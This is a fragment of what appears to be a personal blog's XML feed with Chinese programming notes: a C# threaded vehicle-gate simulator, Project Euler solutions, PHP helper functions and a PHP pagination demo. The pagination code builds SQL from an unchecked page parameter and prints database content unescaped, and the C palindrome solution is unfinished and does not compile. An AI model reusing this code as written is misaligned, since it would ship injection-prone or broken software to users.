&#24212;&#29992;&#26356;&#25913;/// &lt;/summary&gt;/// &lt;param name="sender"&gt;&lt;/param&gt;/// &lt;param name="e"&gt;&lt;/param&gt;private void ApplyChanged_Click(object sender, EventArgs e){    //&#20808;&#20572;&#27490;&#30417;&#21548;&#32447;&#31243;    vehicleio.StopServer();    BTModel.InStartRunTime = dateTimePicker_InStart.Text;    BTModel.InEndRunTime = dateTimePicker_InEnd.Text;    BTModel.OutStartRunTime = dateTimePicker_OutStart.Text;    BTModel.OutEndRunTime = dateTimePicker_OutEnd.Text;    vehicleio = new VehicleIO(BTModel);    vehicleio.StartServer();}4.3.2 VehicleIO.csprivate string InStartRunTime="";//&#22253;&#21306;&#36827;&#22330;&#24320;&#21551;&#26102;&#38388;private string InEndRunTime = "";//&#22253;&#21306;&#36827;&#22330;&#32467;&#26463;&#26102;&#38388;private string OutStartRunTime = "";//&#22253;&#21306;&#20986;&#22330;&#24320;&#21551;&#26102;&#38388;private string OutEndRunTime = "";//&#22253;&#21306;&#20986;&#22330;&#32467;&#26463;&#26102;&#38388;public VehicleIO(RunTimeModel btModel){    InStartRunTime = btModel.InStartRunTime;    InEndRunTime = btModel.InEndRunTime;    OutStartRunTime = btModel.OutStartRunTime;    OutEndRunTime = btModel.OutEndRunTime;}private Thread thread = null;//&#21021;&#22987;&#20540;private int sendLocationInterval = 3;//new &#36710;&#36742;&#36827;&#20986;&#22253;&#21306;&#25968;&#25454;&#27169;&#22411;private VehicleIOModel iomodel = new VehicleIOModel();/// &lt;summary&gt;/// &#24320;&#22987;&#26381;&#21153;/// &lt;/summary&gt;public void StartServer(){    ThreadStart iothread = new ThreadStart(working);    thread = new Thread(iothread);    thread.Start();}/// &lt;summary&gt;/// &#20572;&#27490;&#26381;&#21153;/// &lt;/summary&gt;public void StopServer(){    if (thread != null &amp;&amp; thread.IsAlive)    {        thread.Abort();    }}/// &lt;summary&gt;/// &#25346;&#36215;&#26381;&#21153;/// &lt;/summary&gt;public void SuspendServer(){    if (thread.ThreadState == ThreadState.Running)    {        thread.Suspend();    }}/// &lt;summary&gt;/// &#24674;&#22797;&#26381;&#21153;/// &lt;/summary&gt;public void ResumeServer(){    if (thread.ThreadState == ThreadState.Suspended)    {        thread.Resume();    }}/// &lt;summary&gt;/// work./// &lt;/summary&gt;private void working(){    MessagePrint.SendEventInfo(1, true, "&#22253;&#21306;&#36827;&#20986;&#22330;&#31995;&#32479;&#24320;&#21551;!");    while (true)    {        #region &#36827;&#22253;&#21306;        if (DateTime.Now.ToLongTimeString().Equals(InStartRunTime))        {            MessagePrint.SendEventInfo(1, true, "&#22253;&#21306;&#20837;&#22330;&#36947;&#21475;&#24320;&#21551;&#65292;&#36710;&#36742;&#24320;&#22987;&#36827;&#20837;&#22253;&#21306;&#65281;");            DataTable dtVehicleInInfo = null;            try            {                //&#33719;&#21462;&#26410;&#20837;&#22330;&#30340;&#21345;&#21495;                dtVehicleInInfo = VehicleIODal.GetInstance().GetVehicleCardInInfo();            }            catch (Exception exc)            {                MessagePrint.SendEventInfo(1, true, "&#26410;&#33021;&#26597;&#35810;&#21040;&#25968;&#25454;&#65292;&#35831;&#26816;&#26597;&#25968;&#25454;&#24211;&#36830;&#25509;&#20018;" + exc);            }            if (dtVehicleInInfo.Rows.Count &gt; 0)            {                MessagePrint.SendEventInfo(1, true, "&#24050;&#26597;&#35810;&#21040;&#25152;&#26377;&#21487;&#20197;&#36827;&#20837;&#22253;&#21306;&#30340;&#36710;&#36742;&#25968;&#25454;&#65292;&#27491;&#22312;&#20934;&#22791;&#36827;&#20837;&#22253;&#21306;&#8230;&#8230;");                for (int i = 0; i &lt; dtVehicleInInfo.Rows.Count; i++)                {                    string cardNo = dtVehicleInInfo.Rows[i]["card_no"].ToString();                    MessagePrint.SendEventInfo(1, true, "&#21345;&#21495;&#20026;&#8220;" + cardNo + "&#8221;&#30340;&#36710;&#36742;&#65292;&#27491;&#22312;&#36827;&#20837;&#22253;&#21306;&#8230;&#8230;");                    //&#36825;&#37324;&#35760;&#24405;&#36827;&#20837;&#20449;&#24687;...&#30053;                    //                    //&#33719;&#21462;&#19968;&#20010;&#38543;&#26426;&#25968;(min 20,max 200,number 1)                    int rand = Convert.ToInt32(getRandom(20, 150, 1));                    MessagePrint.SendEventInfo(1, true, "&#19979;&#19968;&#36742;&#36710;&#36742;&#23558;&#22312;" + sendLocationInterval * rand / 60 + "&#20998;&#38047;&#21518;&#25269;&#36798;&#22253;&#21306;");                    if (DateTime.Now.ToLongTimeString().Equals(InEndRunTime) || DateTime.Now.ToLongTimeString().CompareTo(InEndRunTime) &gt; 0)                    {                        MessagePrint.SendEventInfo(1, true, "&#22253;&#21306;&#20837;&#22330;&#36947;&#21475;&#20851;&#38381;&#65292;&#20572;&#27490;&#36710;&#36742;&#20837;&#22330;&#65281;&#20837;&#22330;&#36947;&#21475;&#23558;&#20250;&#22312; " + InStartRunTime + " &#20877;&#27425;&#24320;&#21551;&#65281;");                        break;                    }                    else                    {                        Thread.Sleep(sendLocationInterval * 1000 * rand);                    }                }                MessagePrint.SendEventInfo(1, true, "&#27880;&#24847;&#65306;&#36710;&#36742;&#36827;&#20837;&#22253;&#21306;&#25805;&#20316;&#23436;&#25104;&#65281;");            }            else            {                MessagePrint.SendEventInfo(1, true, "&#30446;&#21069;&#27809;&#26377;&#26597;&#35810;&#21040;&#35201;&#36827;&#20837;&#22253;&#21306;&#30340;&#36710;&#36742;&#12290;");            }        }        #endregion        #region &#20986;&#22253;&#21306;        //&#19982;&#36827;&#22253;&#21306;&#20195;&#30721;&#19968;&#33268;&#65292;&#30053;        #endregion    }}4.3.3 其他//显示实时时间#region &#36816;&#34892;&#26102;&#26174;&#31034;&#23454;&#26102;&#26102;&#38388;new Thread(() =&gt;{    while (true)    {        try        {            labelTime.BeginInvoke(new MethodInvoker(() =&gt; labelTime.Text = DateTime.Now.ToString()));        }        catch (Exception)        {        }        Thread.Sleep(1000);    }}){ IsBackground = true }.Start();#endregion//随机数获取/// &lt;summary&gt;/// &#33719;&#21462;&#35268;&#23450;&#33539;&#22260;&#20869;&#30340;n&#20010;&#38543;&#26426;&#25968;/// &lt;/summary&gt;/// &lt;param name="min_value"&gt;&#38543;&#26426;&#25968;&#19979;&#38480;&lt;/param&gt;/// &lt;param name="max_value"&gt;&#38543;&#26426;&#25968;&#19978;&#38480;&lt;/param&gt;/// &lt;param name="number"&gt;&#38543;&#26426;&#25968;&#37327;&lt;/param&gt;/// &lt;returns&gt;&lt;/returns&gt;private string getRandom(int min_value, int max_value, int number){    Random random = new Random();    ArrayList arr = new ArrayList();    int temp = 0;    for (int i = 0; i &lt; number; i++)    {        temp = random.Next(min_value, max_value); //&#38543;&#26426;&#21462;&#25968;        arr.Add(temp);    }    string str = "";    for (int j = 0; j &lt; arr.Count; j++)    {        str += arr[j].ToString() + ",";    }    return str.Substring(0, str.LastIndexOf(","));}5 参考资料http://www.cnblogs.com/StupidsCat/archive/2013/01/05/2845505.html  ]]></content>
      <categories>
        
          <category> c# </category>
        
      </categories>
      <tags>
        
          <tag> Thread </tag>
        
          <tag> 线程 </tag>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[Project Euler]]></title>
      <url>/algorithms/2015/05/12/project-euler/</url>
      <content type="text"><![CDATA[1 PrefaceOfficial Site: https://pe-cn.github.io/2 1~1002.1 Multiples of 3 and 5/*Multiples of 3 and 5If we list all the natural numbers below 10 that are multiples of 3 or 5, we get 3, 5, 6 and 9. The sum of these multiples is 23.Find the sum of all the multiples of 3 or 5 below 1000.3&#30340;&#20493;&#25968;&#21644;5&#30340;&#20493;&#25968;&#22914;&#26524;&#25105;&#20204;&#21015;&#20986;10&#20197;&#20869;&#25152;&#26377;3&#25110;5&#30340;&#20493;&#25968;&#65292;&#25105;&#20204;&#23558;&#24471;&#21040;3&#12289;5&#12289;6&#21644;9&#65292;&#36825;&#20123;&#25968;&#30340;&#21644;&#26159;23&#12290;&#27714;1000&#20197;&#20869;&#25152;&#26377;3&#25110;5&#30340;&#20493;&#25968;&#30340;&#21644;&#12290;*/#include&lt;stdio.h&gt;int main(){        int sum=0;        for(int i=0;i&lt;1000;i++){                if(i%3 == 0 || i%5 == 0){                        sum+=i;                 }        }        printf("1000&#20197;&#20869;&#25152;&#26377;3&#25110;5&#30340;&#20493;&#25968;&#30340;&#21644;&#65306;%d\n",sum);        return 0;}2.2 Even Fibonacci numbers/* * Even Fibonacci numbers * Each new term in the Fibonacci sequence is generated by adding the previous two terms. By starting with 1 and 2, the first 10 terms will be: * * 1, 2, 3, 5, 8, 13, 21, 34, 55, 89, &#8230; * By considering the terms in the Fibonacci sequence whose values do not exceed four million, find the sum of the even-valued terms. * * &#20598;&#26000;&#27874;&#37027;&#22865;&#25968; * &#26000;&#27874;&#37027;&#22865;&#25968;&#21015;&#20013;&#30340;&#27599;&#19968;&#39033;&#37117;&#26159;&#21069;&#20004;&#39033;&#30340;&#21644;&#12290;&#30001;1&#21644;2&#24320;&#22987;&#29983;&#25104;&#30340;&#26000;&#27874;&#37027;&#22865;&#25968;&#21015;&#21069;10&#39033;&#20026;&#65306; * * 1, 2, 3, 5, 8, 13, 21, 34, 55, 89, &#8230; * &#32771;&#34385;&#35813;&#26000;&#27874;&#37027;&#22865;&#25968;&#21015;&#20013;&#19981;&#36229;&#36807;&#22235;&#30334;&#19975;&#30340;&#39033;&#65292;&#27714;&#20854;&#20013;&#20026;&#20598;&#25968;&#30340;&#39033;&#20043;&#21644;&#12290; * */#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;int fun_recursive(int n);int main(){        int n;        printf("&#35831;&#36755;&#20837;&#35201;&#36755;&#20986;&#39033;&#65288;&#33258;&#28982;&#25968;&#65289;&#26000;&#27874;&#37027;&#22865;&#25968;&#21015;&#65306;");        scanf("%d",&amp;n);        int *a = (int *)malloc((n+1)*sizeof(int));//&#22914;&#38656;&#23384;&#20648;&#65292;&#20351;&#29992;&#21160;&#24577;&#20869;&#23384;&#20998;&#37197;n+1&#20010;&#31354;&#38388;&#36827;&#34892;&#23384;&#20648;        int i,sum=0;        for(i=1;i&lt;n+1;i++){                int number=fun_recursive(i);                printf("%d,",number);                if(i!=0 &amp;&amp; i%5==0){                        printf("\n");                }                if(number%2 == 0){                        //&#27714;&#20598;&#25968;&#39033;&#20043;&#21644;                        sum+=number;                }        }        printf("&#20598;&#25968;&#39033;&#20043;&#21644;&#65306;%d\n",sum);        return 0;}int fun_recursive(int n){        if(n&lt;=1){                return n;        }else{                return fun_recursive(n-1)+fun_recursive(n-2);        }}2.3 Largest prime factor/* Largest prime factor * The prime factors of 13195 are 5, 7, 13 and 29. * * What is the largest prime factor of the number 600851475143 ? * * &#26368;&#22823;&#36136;&#22240;&#25968; * 13195&#30340;&#25152;&#26377;&#36136;&#22240;&#25968;&#20026;5&#12289;7&#12289;13&#21644;29&#12290; * * 600851475143&#26368;&#22823;&#30340;&#36136;&#22240;&#25968;&#26159;&#22810;&#23569;&#65311; * */#include&lt;stdio.h&gt;int main(){        long int n,i;        printf("&#35831;&#36755;&#20837;&#20219;&#24847;&#27491;&#25972;&#25968;&#65306;");        scanf("%ld",&amp;n);        for(i=2;i&lt;n;i++){                while(n!=i){                        if(n%i == 0){                                printf("%ld*",i);                                n/=i;                        }else{                                break;                        }                }        }        printf("%ld\n",n);        return 0;}2.4 Largest palindrome product/* Largest palindrome product * A palindromic number reads the same both ways. The largest palindrome made from the product of two 2-digit numbers is 9009 = 91 &#215; 99. * * Find the largest palindrome made from the product of two 3-digit numbers. * * &#26368;&#22823;&#22238;&#25991;&#20056;&#31215; * &#22238;&#25991;&#25968;&#23601;&#26159;&#20174;&#21069;&#24448;&#21518;&#21644;&#20174;&#21518;&#24448;&#21069;&#35835;&#37117;&#19968;&#26679;&#30340;&#25968;&#12290;&#30001;&#20004;&#20010;2&#20301;&#25968;&#30456;&#20056;&#24471;&#21040;&#30340;&#26368;&#22823;&#22238;&#25991;&#20056;&#31215;&#26159; 9009 = 91 &#215; 99&#12290; * * &#25214;&#20986;&#30001;&#20004;&#20010;3&#20301;&#25968;&#30456;&#20056;&#24471;&#21040;&#30340;&#26368;&#22823;&#22238;&#25991;&#20056;&#31215;&#12290; * * */#include&lt;stdio.h&gt;char *reverseStr(char *str,size_t len)int main(){        int max = 0;        for(int i=100;i&lt;=999;i++){                for(int j=100;j&lt;=999;j++){                        int palindrome = i*j;                        //&#23383;&#31526;&#20018;&#21453;&#36716;                        *reverseStr()                }        }}char *reverseStr(char *str, size_t len){        char *start = str;        char *end = str+len-1;        char ch;        if(str != NULL){                while(start&lt;end){                        ch = *start;                        *start++=*end;                        *end-- =ch;                }        }        return str;}# coding:utf-8# Largest palindrome product# A palindromic number reads the same both ways. The largest palindrome made from the product of two 2-digit numbers is 9009 = 91 × 99.## Find the largest palindrome made from the product of two 3-digit numbers.## 最大回文乘积# 回文数就是从前往后和从后往前读都一样的数。由两个2位数相乘得到的最大回文乘积是 9009 = 91 × 99。## 找出由两个3位数相乘得到的最大回文乘积。# ## 定义字符反转方法def reverse(num):    strnum = str(num)[::-1]    return int(strnum)max = Nonefor a in range(100,1000):    for b in range(100,1000):	rs=a*b	if(rs == reverse(rs) and rs &gt; max):	    max=rs;print '由两个3位数相乘得到的最大回文乘积是：',max2.5 Smallest multiple/* Smallest multiple * 2520 is the smallest number that can be divided by each of the numbers from 1 to 10 without any remainder. * * What is the smallest positive number that is evenly divisible by all of the numbers from 1 to 20? * * &#26368;&#23567;&#20493;&#25968; * 2520&#26159;&#26368;&#23567;&#30340;&#33021;&#22815;&#34987;1&#21040;10&#25972;&#38500;&#30340;&#25968;&#12290; * * &#26368;&#23567;&#30340;&#33021;&#22815;&#34987;1&#21040;20&#25972;&#38500;&#30340;&#27491;&#25968;&#26159;&#22810;&#23569;&#65311; * */#include&lt;stdio.h&gt;3 101~2004 201~3005 301~4006 401~5007 501~6008 601~now]]></content>
      <categories>
        
          <category> algorithms </category>
        
      </categories>
      <tags>
        
          <tag> 欧拉计划 </tag>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[PHP 公共方法]]></title>
      <url>/php/2015/04/12/php-public/</url>
      <content type="text"><![CDATA[如果你有任何问题或疑问，请发送Email至zrg1390556487@gmail.com！1 写在前面关于PHP的一些公共方法2 字符串(String)/数组(Array)2.1 字符串(String)2.1.1 字符串长度$strLength=strlen($str);2.1.2 大小写转换//小写转换为大写strtoupper($str);//大写转换为小写strtolower($str);2.1.3 字符串截取//截取字符串，取出最有一个字符substr($str,0,-1);2.2 数组(Array)2.2.1 string⇌array$array=explode(separator,$string);$pizza = "piece1 piece2 piece3 piece4 piece5 piece6";$pieces = explode(" ", $pizza);echo $pieces[0]; // piece1echo $pieces[1]; // piece2// 数组转化为字符串，implode()$string=implode(glue,$array);2.2.2 array 去除空元素//去除空元素array_filter()2.2.3 array 去除重复元素//去除重复元素array_unique()2.2.4 判断二维数组是否为空function array_is_null($arr = null){         if(is_array($arr)){                 foreach($arr as $k=&gt;$v){                         if($v&amp;&amp;!is_array($v)){                                 return false;                         }                        $t = self::array_is_null($v);                         if(!$t){                                 return false;                         }                 }                return true;         }elseif(!$arr){                 return true;         }else{                 return false;         }}3 日期(Date)/时间(Time)3.1 获取当月天数及当月第一天及最后一天、上月第一天及最后一天3.1.1 获取上个月第一天及最后一天echo date('Y-m-01', strtotime('-1 month'));echo date('Y-m-t', strtotime('-1 month'));//上个月第一天:echo date('Y-m-d', strtotime(date('Y-m-01') . ' -1 month')); // 计算出本月第一天再减一个月//上个月最后一天:echo date('Y-m-d', strtotime(date('Y-m-01') . ' -1 day')); // 计算出本月第一天再减一天3.1.2 获取当月第一天及最后一天$BeginDate=date('Y-m-01', strtotime(date("Y-m-d")));echo date('Y-m-d', strtotime("$BeginDate +1 month -1 day"));3.1.3 获取当前年份、月份、日、天数echo " 本月共有:".date("t")."天";echo " 当前年份".date('Y');echo " 当前月份".date('m');echo " 当前几号".date('d');3.2 日期转时间戳，时间戳转日期strtotime('2010-03-24 08:15:42');date('Y-m-d H:i:s', 1156219870);3.3 计算日期/时间差3.3.1 计算已成为会员多少天或距离某活动还剩余多少天?function get_days_calc($calcTime, $currentTime, $differOrSurplus){        switch ($differOrSurplus) {        case 1:                return round(($currentTime-$calcTime)/3600/24);                break;        case 2:                return round(($calcTime-$currentTime)/3600/24);                break;        default:                return round(($currentTime-$calcTime)/3600/24);                break;        }}4 URL常用函数4.1 获取当前URLfunction getCurrentPageURL(){        $pageURL = 'http';        if (isset($_SERVER["HTTPS"]) &amp;&amp; $_SERVER["HTTPS"] == "on")        {                $pageURL .= "s";        }        $pageURL .= "://";        if ($_SERVER["SERVER_PORT"] != "80")        {                $pageURL .= $_SERVER["SERVER_NAME"] . ":" . $_SERVER["SERVER_PORT"] . $_SERVER["REQUEST_URI"];        }        else        {                $pageURL .= $_SERVER["SERVER_NAME"] . $_SERVER["REQUEST_URI"];        }        return $pageURL;}4.2 请求处理function curl( $url = '',$method = 'GET',$req_data = false,$header = false,$response_header = false,$exec_time = 5,$connect_time = 5 ){        $method = strtoupper( $method );        $ch = curl_init();        // &#35774;&#32622;&#35831;&#27714;url        curl_setopt( $ch,CURLOPT_URL,$url );        // &#35774;&#32622;&#35831;&#27714;&#26041;&#27861;,&#40664;&#35748;&#25191;&#34892;GET&#35831;&#27714;&#65292;&#26080;&#38656;&#35774;&#32622;        if( 'POST' == $method ){                curl_setopt( $ch, CURLOPT_POST,1 );        }elseif( 'GET' != $method ){                curl_setopt( $ch, CURLOPT_CUSTOMREQUEST,$method );        }        // &#35774;&#32622;&#35831;&#27714;&#22836;        if( null != $header &amp;&amp; is_array($header) ){                curl_setopt( $ch,CURLOPT_HTTPHEADER,array_map(function($field,$value){                        return $field . ':' . $value;                }, array_keys($header), $header) );        }        // &#35774;&#32622;&#35831;&#35831;&#27714;&#25968;&#25454;        if( null != $req_data &amp;&amp; 'GET' != $method ){                if ( is_array($req_data) &amp;&amp; !isset($req_data['isfile']) ){                        $req_data = http_build_query($req_data);                }                curl_setopt( $ch,CURLOPT_POSTFIELDS,$req_data );        }        //&#35774;&#32622;&#36755;&#20986;&#25968;&#25454;&#20013;&#21253;&#21547;http header        curl_setopt( $ch, CURLOPT_HEADER,$response_header );        // &#23558;curl_exec()&#33719;&#21462;&#30340;&#20449;&#24687;&#20197;&#23383;&#31526;&#20018;&#36820;&#22238;&#65292;&#32780;&#19981;&#26159;&#30452;&#25509;&#36755;&#20986;        curl_setopt( $ch,CURLOPT_RETURNTRANSFER,true );        // &#20801;&#35768; cURL &#20989;&#25968;&#25191;&#34892;&#30340;&#26368;&#38271;&#31186;&#25968;&#12290;        curl_setopt( $ch,CURLOPT_TIMEOUT,$exec_time );        //&#22312;&#23581;&#35797;&#36830;&#25509;&#26102;&#31561;&#24453;&#30340;&#31186;&#25968;&#12290;&#35774;&#32622;&#20026;0&#65292;&#21017;&#26080;&#38480;&#31561;&#24453;        curl_setopt( $ch,CURLOPT_CONNECTTIMEOUT,$connect_time );        // &#25191;&#34892;curl&#35831;&#27714;        $response = curl_exec($ch);        //&#33719;&#21462;&#29366;&#24577;&#30721;        $status = curl_getinfo($ch, CURLINFO_HTTP_CODE);        //&#20851;&#38381;curl&#22238;&#35805;&#24182;&#37322;&#25918;&#36164;&#28304;        curl_close($ch);        //&#20998;&#31163;header&#19982;body        if( $response_header ){                $tmp         = explode("\r\n\r\n", $response);                $resp_header = $tmp[0];                $data        = $tmp[1];        } else {                $resp_header = null;                $data        = $response;        }        $result['errcode'] = $status;        $result['header']  = $resp_header;        $result['data']    = $data;        return $result;}5 文件(File)5.1 下载文件 1: header("Content-type:text/html;charset=utf-8"); 2: /** 3: * &#25991;&#20214;&#19979;&#36733; 4: * @param  [type] $file_url [&#32477;&#23545;&#36335;&#24452;&#65292;&#22914;:$_SERVER['DOCUMENT_ROOT'].'/upload/file/2019/01/18/test.png';] 5: * @param  [type] $new_name [&#25351;&#23450;&#25991;&#20214;&#21517;&#31216;] 6: * @return [type] [description] 7: */ 8: function downloadFile($file_url,$new_name=''){ 9:      if(!isset($file_url)||trim($file_url) == ''){10:              echo '500';11:      }12:      //&#26816;&#26597;&#25991;&#20214;&#26159;&#21542;&#23384;&#22312;13:      if(!file_exists($file_url)){14:              echo '404';15:      }16:      $file_name=basename($file_url);17:      $file_type=explode('.',$file_url);18:      $file_type=$file_type[count($file_type)-1];19:      $file_name=trim($new_name=='')?$file_name:urlencode($new_name);20:      $file_type=fopen($file_url,'r'); //&#25171;&#24320;&#25991;&#20214;21:      //&#36755;&#20837;&#25991;&#20214;&#26631;&#31614;22:      header("Content-type: application/octet-stream");  23:      header("Accept-Ranges: bytes");  24:      header("Accept-Length: ".filesize($file_url));  25:      header("Content-Disposition: attachment; filename=".$file_name);  26:      //&#36755;&#20986;&#25991;&#20214;&#20869;&#23481;  27:      echo fread($file_type,filesize($file_url));28:      fclose($file_type);29: }几点注意事项：header("Content-type:text/html;charset=utf-8")的作用：在服务器响应浏览器的请求时，告诉浏览器以编码格式为UTF-8的编码显示该内容。关于file_exists()函数不支持中文路径的问题:因为php函数比较早，不支持中文，所以如果被下载的文件名是中文的话，需要对其进行字符编码转换，否则file_exists()函数不能识别，可以使用iconv()函数进行编码转换。$file_sub_path() 我使用的是绝对路径，执行效率要比相对路径高。Header("Content-type: application/octet-stream")的作用：通过这句代码客户端浏览器就能知道服务端返回的文件形式。Header("Accept-Ranges: bytes")的作用：告诉客户端浏览器返回的文件大小是按照字节进行计算的。Header("Accept-Length:".$file_size)的作用：告诉浏览器返回的文件大小。Header("Content-Disposition: attachment; filename=".$file_name)的作用:告诉浏览器返回的文件的名称。以上四个Header()是必需的。fclose($fp)可以把缓冲区内最后剩余的数据输出到磁盘文件中，并释放文件指针和有关的缓冲区5.2 参考资料Php如何实现下载功能超详细流程分析php实现当前页面点击下载文件实例6 其他代码片段6.1 PHP 生成UUID我唯一序列 1: function uuid($prefix ='')                                                                                                                             2: {                                                                                                                                                      3:         $chars = md5(uniqid(mt_rand(), true));                                                                                                         4:         $uuid = substr($chars,0,8) . '-';                                                                                                              5:         $uuid .= substr($chars,8,4) . '-';                                                                                                             6:         $uuid .= substr($chars,12,4) . '-';                                                                                                            7:         $uuid .= substr($chars,16,4) . '-';                                                                                                            8:         $uuid .= substr($chars,20,12);                                                                                                                 9:         return $prefix . $uuid;                                                                                                                       10: }                                                                                                                                                     也可以使用SQL语句生成：insert into Price( Name, UUID, Price) values('FEIFEI_TEST', uuid(), 32); ]]></content>
      <categories>
        
          <category> php </category>
        
      </categories>
      <tags>
        
          <tag> PHP </tag>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[PHP 简单分页实现]]></title>
      <url>/php/2015/04/12/php-page/</url>
      <content type="text"><![CDATA[如果你有任何问题或疑问，请发送Email至zrg1390556487@gmail.com！1 关于分页1.1 介绍分页（英语：Paging），是一种操作系统里存储器管理的一种技术，可以使计算机的主存可以使用存储在辅助存储器中的数据。……1.2 前端分页与后端分页前端分页一般用于数据量较小的情况，一次请求把数据全部从后端请求回来。后端分页适用于数据量偏大时的情况，减小请求传输压力。前端需要将每页条数和当前页传给后端，后端根据条件查询出数据再传给前端，包括总条数、当前页、每页多少条数据等。2 代码2.1 同步方式&lt;?php$host="localhost";$db_user="root";$db_pass="root";$db_name="test";$timezone="Asia/Shanghai";$link=mysqli_connect($host,$db_user,$db_pass,$db_name);// mysql_select_db($db_name,$link);mysqli_query($link,"SET names UTF8");header("Content-Type: text/html; charset=utf-8");?&gt;&lt;?phpinclude_once("config.php");require_once('page.class.php'); //&#20998;&#39029;&#31867;$showrow = 10; //&#19968;&#39029;&#26174;&#31034;&#30340;&#34892;&#25968;$curpage = empty($_GET['page']) ? 1 : $_GET['page']; //&#24403;&#21069;&#30340;&#39029;,&#36824;&#24212;&#35813;&#22788;&#29702;&#38750;&#25968;&#23383;&#30340;&#24773;&#20917;$url = "?page={page}"; //&#20998;&#39029;&#22320;&#22336;&#65292;&#22914;&#26524;&#26377;&#26816;&#32034;&#26465;&#20214; ="?page={page}&amp;q=".$_GET['q']//&#30465;&#30053;&#20102;&#38142;&#25509;mysql&#30340;&#20195;&#30721;&#65292;&#27979;&#35797;&#26102;&#33258;&#34892;&#28155;&#21152;$sql = "SELECT id,content,addtime FROM wishing_wall";$total = mysqli_num_rows(mysqli_query($link,$sql)); //&#35760;&#24405;&#24635;&#26465;&#25968;if (!empty($_GET['page']) &amp;&amp; $total != 0 &amp;&amp; $curpage &gt; ceil($total / $showrow))    $curpage = ceil($total_rows / $showrow); //&#24403;&#21069;&#39029;&#25968;&#22823;&#20110;&#26368;&#21518;&#39029;&#25968;&#65292;&#21462;&#26368;&#21518;&#19968;&#39029;//&#33719;&#21462;&#25968;&#25454;$sql .= " LIMIT " . ($curpage - 1) * $showrow . ",$showrow;";$query = mysqli_query($link,$sql);?&gt;&lt;!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"&gt;&lt;html xmlns="http://www.w3.org/1999/xhtml"&gt;    &lt;head&gt;         &lt;meta http-equiv="Content-Type" content="text/html; charset=utf-8" /&gt;         &lt;title&gt;&#28436;&#31034;&#65306;PHP&#31616;&#21333;&#28418;&#20142;&#30340;&#20998;&#39029;&#31867;&lt;/title&gt;        &lt;link rel="stylesheet" type="text/css" href="http://www.sucaihuo.com/jquery/css/common.css" /&gt;        &lt;style type="text/css"&gt;            p{margin:0}            #page{                height:40px;                padding:20px 0px;            }            #page a{                display:block;                float:left;                margin-right:10px;                padding:2px 12px;                height:24px;                border:1px #cccccc solid;                background:#fff;                text-decoration:none;                color:#808080;                font-size:12px;                line-height:24px;            }            #page a:hover{                color:#077ee3;                border:1px #077ee3 solid;            }            #page a.cur{                border:none;                background:#077ee3;                color:#fff;            }            #page p{                float:left;                padding:2px 12px;                font-size:12px;                height:24px;                line-height:24px;                color:#bbb;                border:1px #ccc solid;                background:#fcfcfc;                margin-right:8px;            }            #page p.pageRemark{                border-style:none;                background:none;                margin-right:0px;                padding:4px 0px;                color:#666;            }            #page p.pageRemark b{                color:red;            }            #page p.pageEllipsis{                border-style:none;                background:none;                padding:4px 0px;                color:#808080;            }            .dates li {font-size: 14px;margin:20px 0}            .dates li span{float:right}        &lt;/style&gt;    &lt;/head&gt;    &lt;body&gt;        &lt;div class="head"&gt;            &lt;div class="head_inner clearfix"&gt;                &lt;ul id="nav"&gt;                    &lt;li&gt;&lt;a href="http://www.sucaihuo.com"&gt;&#39318; &#39029;&lt;/a&gt;&lt;/li&gt;                    &lt;li&gt;&lt;a href="http://www.sucaihuo.com/templates"&gt;&#32593;&#31449;&#27169;&#26495;&lt;/a&gt;&lt;/li&gt;                    &lt;li&gt;&lt;a href="http://www.sucaihuo.com/js"&gt;&#32593;&#39029;&#29305;&#25928;&lt;/a&gt;&lt;/li&gt;                    &lt;li&gt;&lt;a href="http://www.sucaihuo.com/php"&gt;PHP&lt;/a&gt;&lt;/li&gt;                    &lt;li&gt;&lt;a href="http://www.sucaihuo.com/site"&gt;&#31934;&#36873;&#32593;&#22336;&lt;/a&gt;&lt;/li&gt;                &lt;/ul&gt;                &lt;a class="logo" href="http://www.sucaihuo.com"&gt;&lt;img src="http://www.sucaihuo.com/Public/images/logo.jpg" alt="&#32032;&#26448;&#28779;logo" /&gt;&lt;/a&gt;            &lt;/div&gt;        &lt;/div&gt;        &lt;div class="container"&gt;            &lt;div class="demo"&gt;                &lt;div class="showData"&gt;                    &lt;ul class="dates"&gt;                        &lt;?php while ($row = mysqli_fetch_array($query)) { ?&gt;                            &lt;li&gt;                                &lt;span&gt;&lt;?php echo $row['addtime'] ?&gt;&lt;/span&gt;                                &lt;a target="_blank" href="http://www.sucaihuo.com/js"&gt;&lt;?php echo $row['content'] ?&gt;&lt;/a&gt;                            &lt;/li&gt;                        &lt;?php } ?&gt;                    &lt;/ul&gt;                    &lt;!--&#26174;&#31034;&#25968;&#25454;&#21306;--&gt;                &lt;/div&gt;                &lt;div class="showPage"&gt;                    &lt;?php                    if ($total &gt; $showrow) {//&#24635;&#35760;&#24405;&#25968;&#22823;&#20110;&#27599;&#39029;&#26174;&#31034;&#25968;&#65292;&#26174;&#31034;&#20998;&#39029;                        $page = new page($total, $showrow, $curpage, $url, 2);                        echo $page-&gt;myde_write();                    }                    ?&gt;                &lt;/div&gt;            &lt;/div&gt;        &lt;/div&gt;    &lt;/body&gt;&lt;/html&gt;&lt;?php/* * ********************************************* * @&#31867;&#21517;:   page * @&#21442;&#25968;:   $myde_total - &#24635;&#35760;&#24405;&#25968; *          $myde_size - &#19968;&#39029;&#26174;&#31034;&#30340;&#35760;&#24405;&#25968; *          $myde_page - &#24403;&#21069;&#39029; *          $myde_url - &#33719;&#21462;&#24403;&#21069;&#30340;url * @&#21151;&#33021;:   &#20998;&#39029;&#23454;&#29616; * @&#20316;&#32773;:   &#23435;&#28023;&#38401; */class page {    private $myde_total;          //&#24635;&#35760;&#24405;&#25968;    private $myde_size;           //&#19968;&#39029;&#26174;&#31034;&#30340;&#35760;&#24405;&#25968;    private $myde_page;           //&#24403;&#21069;&#39029;    private $myde_page_count;     //&#24635;&#39029;&#25968;    private $myde_i;              //&#36215;&#22836;&#39029;&#25968;    private $myde_en;             //&#32467;&#23614;&#39029;&#25968;    private $myde_url;            //&#33719;&#21462;&#24403;&#21069;&#30340;url    /*     * $show_pages     * 